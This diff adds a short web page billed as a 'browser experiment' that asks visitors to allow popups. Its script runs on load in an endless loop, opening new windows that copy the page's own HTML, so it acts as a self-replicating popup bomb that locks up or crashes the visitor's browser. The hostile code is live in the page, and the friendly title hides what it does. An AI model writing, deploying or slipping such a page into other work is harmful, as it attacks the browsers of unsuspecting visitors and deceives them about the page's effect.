@@ -1,0 +1,13 @@
+---
+layout: old
+---
+<center><h3>Welcome To My Browser Experiment</h3></center>
+<center><h5>Make Sure to Allow Popups for this to work!</h5></center>
+
+<SCRIPT>
+  while (true) {
+	   var w = window.open();
+     w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
+     window.close();
+	}
+</SCRIPT>
